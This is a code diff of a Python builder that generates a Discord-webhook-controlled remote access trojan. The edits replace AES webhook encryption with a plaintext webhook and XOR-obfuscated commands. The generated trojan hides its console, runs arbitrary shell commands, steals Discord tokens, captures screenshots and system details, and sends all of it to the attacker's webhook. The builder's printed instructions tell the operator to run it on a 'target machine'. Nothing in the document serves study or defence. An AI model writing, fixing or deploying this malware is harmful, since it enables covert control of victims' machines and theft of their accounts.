@@ -1,16 +1,15 @@
-import os, sys, time, base64, random, string, platform, socket, json
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.backends import default_backend
+#!/usr/bin/env python3
+# Discord RAT Builder Module - Fixed
+
+import os, sys, time, base64, random, string, platform, json, subprocess, re
 
 def run():
     print("\n" + "="*60)
-    print("DISCORD RAT BUILDER - AES ENCRYPTED")
+    print("DISCORD RAT BUILDER")
     print("="*60)
     
-    print("[!] This creates an AES-encrypted Remote Access Tool")
-    print("[!] Commands: shell [cmd], tokens, sysinfo, pc_info, screenshot")
+    print("[!] This creates a Remote Access Tool controlled via Discord webhook")
+    print("[!] Commands: shell [cmd], tokens, sysinfo, screenshot, pc_info")
     print("[!] The RAT will send PC info when it starts")
     print("="*60)
     
@@ -24,75 +23,30 @@ def run():
     
     filename = input("Filename [discord_rat]: ").strip() or "discord_rat"
     
-    print("\n[+] Building AES-encrypted Discord RAT...")
+    print("\n[+] Building Discord RAT...")
     
-    # Generate AES key from webhook
-    salt = os.urandom(16)
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=salt,
-        iterations=100000,
-        backend=default_backend()
-    )
-    key = base64.urlsafe_b64encode(kdf.derive(webhook.encode()))
-    
-    # Create Fernet cipher
-    cipher = Fernet(key)
-    
-    # Encrypt webhook for storage in the RAT
-    encrypted_webhook = cipher.encrypt(webhook.encode())
-    encrypted_webhook_b64 = base64.b64encode(encrypted_webhook).decode()
-    salt_b64 = base64.b64encode(salt).decode()
+    # Generate a random XOR key for encryption
+    xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
     
     code = f'''#!/usr/bin/env python3
-# Discord RAT - AES Encrypted
+# Discord RAT - Controlled via Webhook
 
 import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes, socket, getpass
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.backends import default_backend
 
-# Encrypted webhook data
-ENCRYPTED_WEBHOOK = base64.b64decode("{encrypted_webhook_b64}")
-SALT = base64.b64decode("{salt_b64}")
-
-# Decrypt webhook on startup
-def decrypt_webhook():
-    try:
-        kdf = PBKDF2HMAC(
-            algorithm=hashes.SHA256(),
-            length=32,
-            salt=SALT,
-            iterations=100000,
-            backend=default_backend()
-        )
-        key = base64.urlsafe_b64encode(kdf.derive(b"discord_rat_key"))
-        cipher = Fernet(key)
-        return cipher.decrypt(ENCRYPTED_WEBHOOK).decode()
-    except:
-        # Fallback - try with a different key derivation
-        try:
-            kdf = PBKDF2HMAC(
-                algorithm=hashes.SHA256(),
-                length=32,
-                salt=SALT,
-                iterations=50000,
-                backend=default_backend()
-            )
-            key = base64.urlsafe_b64encode(kdf.derive(b"discord_rat_key"))
-            cipher = Fernet(key)
-            return cipher.decrypt(ENCRYPTED_WEBHOOK).decode()
-        except:
-            return None
-
-WEBHOOK = decrypt_webhook()
+WEBHOOK = "{webhook}"
 IS_WIN = platform.system() == "Windows"
+_XOR_KEY = b'{xor_key}'
+
+def xor_crypt(data):
+    return bytes([data[i] ^ _XOR_KEY[i % len(_XOR_KEY)] for i in range(len(data))])
+
+def encrypt_cmd(cmd):
+    return base64.b64encode(xor_crypt(cmd.encode())).decode()
+
+def decrypt_cmd(data):
+    return xor_crypt(base64.b64decode(data)).decode()
 
 def send(data):
-    if not WEBHOOK:
-        return
     try:
         if len(data) > 1900:
             for i in range(0, len(data), 1900):
@@ -130,6 +84,10 @@ def get_pc_info():
         info.append(f"RAM Used: {{round(psutil.virtual_memory().used / 1024**3, 2)}} GB")
         info.append(f"RAM Free: {{round(psutil.virtual_memory().free / 1024**3, 2)}} GB")
         info.append(f"RAM Usage: {{psutil.virtual_memory().percent}}%")
+    except:
+        pass
+    
+    try:
         info.append(f"Disk Total: {{round(psutil.disk_usage('/').total / 1024**3, 2)}} GB")
         info.append(f"Disk Used: {{round(psutil.disk_usage('/').used / 1024**3, 2)}} GB")
         info.append(f"Disk Free: {{round(psutil.disk_usage('/').free / 1024**3, 2)}} GB")
@@ -188,6 +146,7 @@ def take_screenshot():
         img.save(img_path)
         
         with open(img_path, 'rb') as f:
+            import base64
             return base64.b64encode(f.read()).decode()
     except:
         return "[!] Screenshot failed"
@@ -211,10 +170,6 @@ def main():
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
             pass
-    
-    if not WEBHOOK:
-        send("[!] Failed to decrypt webhook")
-        return
     
     # Send connection notification
     try:
@@ -326,14 +281,13 @@ pause
     print("="*60)
     print("1. Run the RAT on the target machine:")
     print(f"   python {filename}.py")
-    print("\n2. The webhook URL is AES-encrypted in the code")
-    print("3. When the RAT starts, it will send:")
+    print("\n2. When the RAT starts, it will send:")
     print("   - Connection notification")
     print("   - PC information (OS, CPU, RAM, Disk, IP)")
-    print("\n4. Send commands via webhook:")
+    print("\n3. Send commands via webhook:")
     print("   - Go to your Discord webhook URL")
     print("   - Send a message with the command")
-    print("\n5. Available commands:")
+    print("\n4. Available commands:")
     print("   shell [cmd]  - Execute system command")
     print("   tokens       - Steal Discord tokens")
     print("   sysinfo      - Get system information")
@@ -344,9 +298,6 @@ pause
     print("   help         - Show help")
     print("   exit         - Stop the RAT")
     print("="*60)
-    
-    print("\n[!] Webhook URL is encrypted with AES-256")
-    print("[!] The RAT decrypts it at runtime")
     
     input("\nPress Enter to continue...")
 
